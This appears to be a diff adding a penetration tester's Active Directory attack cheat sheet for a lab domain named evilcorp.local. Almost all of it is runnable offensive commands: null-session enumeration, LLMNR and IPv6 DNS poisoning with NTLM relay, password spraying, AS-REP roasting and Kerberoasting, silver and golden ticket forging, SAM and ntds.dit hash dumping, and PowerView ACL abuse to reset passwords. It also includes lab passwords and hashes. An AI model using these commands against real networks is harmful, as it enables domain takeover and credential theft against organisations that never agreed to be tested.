@@ -1,0 +1,257 @@
+---------------------------------------------------------------------LDAP Null session enum----------------------------------------------------------------------------
+#what are naming contexts for DC-- think of naming contexts like directories
+ldapsearch -h 192.168.26.140 -x -s base namingcontexts
+
+#search for attributes to the bn evilcorp.local domain component
+#if this errors out with no bind, may show anonymous accounts aka null sessions disabled by gp policy
+ldapsearch -h 192.168.26.140 -x -b "DC=evilcorp,DC=local"
+
+#if this does NOT error...query domain component for all objects, attributes
+ldapsearch -h 192.168.26.140 -x -b "DC=evilcorp,DC=local"
+ldapsearch -h 192.168.26.140 -x -b "DC=evilcorp,DC=local" '(objectClass=Person)'	//when user created, suc logons, email addresses? from principle name, pwd last set
+ldapsearch -h 192.168.26.140 -x -b "DC=evilcorp,DC=local" '(objectClass=Person)' sAMAccountName		//username
+
+
+
+--------------------------------------------------------------------LLMNR/NBT-NS Poisoning-----------------------------------------------------------------------------
+#cme to determine what can be tgted for relay attack, makes list on what tgts have smb_signing DISABLED
+crackmapexec smb 192.168.26.0/24 --gen-relay-list targets.txt
+cat targets.txt
+
+#edit responder.conf IF doing relay. Turn off SMB and HTTP servers
+SMB = Off
+HTTP = Off
+
+#fire off responder in a window
+responder -I eth0 -rfw
+
+#fire off ntlmrelayx.py in another window, will dump SAM db of tgt if suc
+ntlmrelayx.py -tf targets.txt
+
+##Alternative-- fire off ntlmrelayx.py with socks, this is louder due to keepalive traffic, will open and preserve sessions
+#first EDIT PROXYCHAINS TO 1080 port
+/home/kali/.local/pipx/venvs/bloodhound/bin/ntlmrelayx.py -tf targets.txt -smb2support -socks
+#suc sessions showed with socks command in ntlmrelayx interactive terminal
+#socks will show admin_status and to what hosts....local admin will not be sufficient
+#suc admin sessions can be used to grab SAM db or....go interactive (system shell)
+proxychains -q /home/kali/.local/pipx/venvs/bloodhound/bin/secretsdump.py EVILCORP/ADMINISTRATOR@192.168.26.141		//note the slash is not Win or escaped!
+proxychains smbexec.py EVILCORP/ADMINISTRATOR@192.168.26.141
+
+
+###or....run PS empire launcher for successful relay
+ntlmrelayx.py -tf targets.txt -c 'powershell -noP -w 1 -enc ....'
+
+--------------------------------------------------------------------IPv6 DNS attack--------------------------------------------------------------------------------------
+#first is IPv6 active on net?
+tcpdump -i eth0 '(udp port 546 or 547) or icmp6' -s0 -vv 	//vv even more verbose...optional
+
+#mitm6 start to poison IPv6 DNS
+sudo mitm6 -d evilcorp.local
+
+#ntlmrelayx to serve wpad file
+/home/kali/.local/pipx/venvs/bloodhound/bin/ntlmrelayx.py -6 -wh random.evilcorp.local -tf targets.txt -smb2support
+/home/kali/.local/pipx/venvs/bloodhound/bin/ntlmrelayx.py -6 -wh random.evilcorp.local -tf targets.txt -smb2support -socks
+
+--------------------------------------------------------------------evil-winRM attack------------------------------------------------------------------------------------
+#TCP5985 open on Windows? Thats WinRM service...win remote mgmt usually enabled on servers
+
+#Validate winrm open and validate creds
+crackmapexec winrm 192.168.26.140 -u TWellick -p Joanna1!
+
+#Have creds?
+./evil-winrm.rb -u svc-alfresco -p s3rvice -i 192.168.26.140
+
+--------------------------------------------------------------------kerbrute for userenum/pwspray------------------------------------------------------------------------
+#userenum, requires list of user guesses
+/opt/kerbrute/kerbrute userenum -t 2 -d evilcorp.local --dc WIN-2US51U5G9AD guessUsers
+
+#passwordpray for testing one or two common passwords
+/opt/kerbrute/kerbrute passwordspray -t 2 -d evilcorp.local --dc WIN-2US51U5G9AD validUsers.txt Password1
+
+--------------------------------------------------------------------crackmapexec-----------------------------------------------------------------------------------------
+#crackmapexec password policy query
+crackmapexec smb 192.168.26.140 --pass-pol 			//attempt pass pol query
+crackmapexec smb 192.168.26.140 --pass-pol -u '' -p ''		//attempt pass pol query with null session for older DCs that were updated... 2k3 2k8
+crackmapexec smb 192.168.26.140 --pass-pol -u 'TColby' -p 'Password1'
+
+#crackmapexec cred validation
+crackmapexec smb 192.168.26.145 -u TWellick -d evilcorp.local -p 'Joanna1!'
+
+--------------------------------------------------------------------rpcclient--------------------------------------------------------------------------------------------
+#rpcclient- using smb to query win env without being authenticated to domain
+rpcclient -U "" 192.168.26.140
+
+#once rpcclient session started (null or authenticated...although authenticated will be over smb traffic, maybe think wmiexec?
+enumdomusers
+enumalsgroups domain
+enumalsgroups builtin
+lookupnames administrators
+lookupnames administrator
+queryuser <rid code>
+queryuser 0x1f4
+getdompwinfo				//password policy
+getusrdompwinfo 0x1f4			//password policy per user
+
+--------------------------------------------------------------------net commands-----------------------------------------------------------------------------------------
+net user /domain
+net user <user> /domain
+net group /domain
+net group <group> /domain
+net accounts /domain				//password policy
+
+--------------------------------------------------------------------ASRep Roasting---------------------------------------------------------------------------------------
+#REQUIRES:DONT_REQUIRE_PREAUTH set on user account in ADUC
+#OUTCOME: Cracked creds from ASREP hash
+#ASREP Roasting for DONT_REQUIRE_PREAUTH set on user account in ADUC
+
+#Get TGT for user without password or find out DONT_REQUIRE_PREAUTH setting
+/home/kali/.local/pipx/venvs/bloodhound/bin/GetNPUsers.py evilcorp/TColby -no-pass -dc-ip 192.168.26.140
+
+#Find all users in domain with DONT_REQUIRE_PREAUTH set REQUIRES password
+/home/kali/.local/pipx/venvs/bloodhound/bin/GetNPUsers.py evilcorp.local/TColby -dc-ip 192.168.26.140
+
+#Get TGT for all users on domain vuln to ASREP roast attack REQUIRES password
+/home/kali/.local/pipx/venvs/bloodhound/bin/GetNPUsers.py evilcorp.local/TColby -dc-ip 192.168.26.140 -request
+
+#Get TGT for users in userlist without password 
+/home/kali/.local/pipx/venvs/bloodhound/bin/GetNPUsers.py evilcorp/TColby -no-pass -dc-ip 192.168.26.140 -usersfile users.txt
+
+#hashcat validate hash format and determine mode flag
+hashcat --example-hashes | grep -i krb
+hashcat --example-hashes | less			//search for header ie krb5asrep to find mode flag
+
+#hashcat syntax for ASREP cracking
+hashcat ./hashcat -m 18200 <ASREP hash> <pw_list>
+
+--------------------------------------------------------------------KerbeRoasting----------------------------------------------------------------------------------------
+#REQUIRES: credentials
+#OUTCOME: Cracked creds from TGS hash
+#kerberoast- get SPNs from domain REQUIRES user and password
+/home/kali/.local/pipx/venvs/bloodhound/bin/GetUserSPNs.py evilcorp.local/TColby -dc-ip 192.168.26.140
+
+#Get all SPNs in domain 
+/home/kali/.local/pipx/venvs/bloodhound/bin/GetUserSPNs.py evilcorp.local/TColby -dc-ip 192.168.26.140 -request
+
+#Get specific user SPN from domain
+/home/kali/.local/pipx/venvs/bloodhound/bin/GetUserSPNs.py evilcorp.local/TColby -dc-ip 192.168.26.140 -request-user SQLService
+
+#hashcat syntax for krb5tgs cracking
+hashcat ./hashcat -m 13100 <TGS KBR hash> <pw_list>
+
+--------------------------------------------------------------------Creds to NTLM python script--------------------------------------------------------------------------
+python3 -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "sansinstitute".encode("utf-16le")).digest()))'
+
+--------------------------------------------------------------------Overpass the Hash/Pass the Key-----------------------------------------------------------------------
+#Requires: service or computer creds/ntlm or KERB5CCNAME cache file or kirbi file
+#Outcome: become Admin or user on computer using ticket as opposed to cred/hash
+#Get LM:NTLM hash via LLMNR poisoning or secretsdump FOR A COMPUTER
+#or get AES256 keys which are dumped in secretsdump for stealthier Overpass the Hash in case of Domain Admin dump
+/home/kali/.local/pipx/venvs/bloodhound/bin/secretsdump.py evilcorp.local/Tcolby:Password1@192.168.26.142		//TColby local admin on 142 gets local hashes
+/home/kali/.local/pipx/venvs/bloodhound/bin/secretsdump.py evilcorp.local/EAlderson:'MrRobot1!'@192.168.26.140 		//DA on 140...gets local and domain hashes
+#if using socks flag with ntlmrelayx search for llmnr poisoning reference to socks proxy usage
+
+##Use mimikatz and ticket converter from .kirbi to ccache file
+sekurlsa::tickets /export
+ticketConverter.py ticket.kirb ticket.ccache
+
+##TGT generation with getTGT.py
+getTGT.py -dc-ip 192.168.26.140 evilcorp.local/Ealderson
+getTGT.py -dc-ip 192.168.26.140 -hashes [LMhash:NThash] evilcorp.local/Ealderson
+getTGT.py -dc-ip 192.168.26.140 -aesKey [aesKey] evilcorp.local/Ealderson
+
+#Profit off of the ccache file
+export KRB5CCNAME=TGT_ccache_file
+python wmiexec.py evilcorp.local/ealderson@192.168.26.140 -k -no-pass
+
+
+--------------------------------------------------------------------Silver Ticket----------------------------------------------------------------------------------------
+#Requires: service NTLM for service account on computer OR computer NTLM for a computer SPN (ie CIFS or HOST)
+#Requires: DOMAIN SID
+#Outcome: become Admin or user on computer in less detectable way (skip TGT request and svc tkt)
+#Get LM:NTLM hash via LLMNR poisoning or secretsdump FOR A COMPUTER
+#or get AES256 keys which are dumped in secretsdump for stealthier Overpass the Hash in case of Domain Admin dump
+/home/kali/.local/pipx/venvs/bloodhound/bin/secretsdump.py evilcorp.local/Tcolby:Password1@192.168.26.142		//TColby local admin on 142 gets local hashes
+/home/kali/.local/pipx/venvs/bloodhound/bin/secretsdump.py evilcorp.local/EAlderson:'MrRobot1!'@192.168.26.140 		//DA on 140...gets local and domain hashes
+#if using socks flag with ntlmrelayx search for llmnr poisoning reference to socks proxy usage
+
+#Silver ticket generation with ticketer.py
+ticketer.py -spn CIFS/SilverShare -domain evilcorp.local -nthash f8a3655139c577f443f5d7f0c2dda300 -dc-ip 192.168.26.140 -domain-sid S-1-5-21-1793608279-3739051141-1539607788 GGoddard
+
+#Use krb5CC ticket
+export KRB5CCNAME=TGT_ccache_file
+python wmiexec.py evilcorp.local/ealderson@192.168.26.140 -k -no-pass
+---note this was not effectively implemented
+
+--------------------------------------------------------------------Golden Ticket----------------------------------------------------------------------------------------
+#Requires: krbtgt from DC or ntds.dit file
+#Requires: DOMAIN SID, DOMAIN name, DC IP 
+#Outcome: Impersonate ANY user in domain with service ticket from forged TGT
+
+#Get krbtgt with domain admin
+crackmapexec smb 192.168.26.140 -u EAlderson -p <pw> -d evilcorp.local --ntds
+
+#Golden ticket generation with ticketer.py
+ticketer.py -domain evilcorp.local -nthash <ntlm hash> -dc-ip 192.168.26.140 -domain-sid <domain sid (not rid)> <user>
+
+#Use krb5CC ticket
+export KRB5CCNAME=TGT_ccache_file
+python wmiexec.py evilcorp.local/ealderson@192.168.26.140 -k -no-pass
+
+--------------------------------------------------------------------BloodHound.py----------------------------------------------------------------------------------------
+#leverage domain account to query AD relationships, objects, etc with python and not sharphound on host
+#like sharphound results in json files for bloodhound
+bloodhound-python -u TColby -p Password1 -d evilcorp.local -dc WIN-2US51U5G9AD
+
+--------------------------------------------------------------------BloodHound-------------------------------------------------------------------------------------------
+#startup neo4j db as sudo or....#
+sudo neo4j console 
+
+#startup bloodhound
+./BloodHound.bin --no-sandbox
+
+#Using ingestor on local machine
+PS C:\Users\tom\Documents> Invoke-BloodHound -CollectionMethod All 
+
+
+--------------------------------------------------------------------AD Config-----------------------------------------------------------------------------------------
+#PS creds for sessions, etc
+$passwd = ConvertTo-SecureString -String 'Password123' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential ('HTB\Claire', $passwd)
+
+#Add user net cmd
+net group backup_admins claire /add
+
+#Add user powerview cmdlet
+Add-DomainGroupMember -Identity 'Backup_Admins' -Members Herman -Credential $cred
+
+
+#Change passwd
+net user Claire Password123
+
+#powerview
+#in this case Tom has first degree object control (writeowner) on Claire
+get-content PowerVIew.ps1 -raw | IEX
+Set-DomainObjectOwner -identity claire -OwnerIdentity tom
+Add-ObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
+$UserPassword = ConvertTo-SecureString -String 'Password123' -AsPlainText -Force
+Set-DomainUserPassword -Identity claire -AccountPassword $UserPassword
+
+
+--------------------------------------------------------------------AD pw hashes--------------------------------------------------------------------------------------
+#secretsdump from SAM, SECURITY and SYSTEM hives for local dumps
+#run local save reg hives to temp dir
+reg save hklm\sam C:\Temp\SAM
+reg save hklm\system C:\Temp\SYSTEM
+reg save hklm\security C:\Temp\SECURITY
+
+#pull using file transfer method...maybe smbclient if tgt is hosting a share
+/home/kali/.local/pipx/venvs/bloodhound/bin/secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
+
+##secretsdump from ntds.dit, SECURITY and SYSTEM hives for domain cred hash dump and kbt dump
+#run local shadow copy ntds.dit file to an EMPTY dir
+ntdsutil "ac in ntds" i "cr fu c:\temp" q q
+/home/kali/.local/pipx/venvs/bloodhound/bin/secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
+
+
+
+
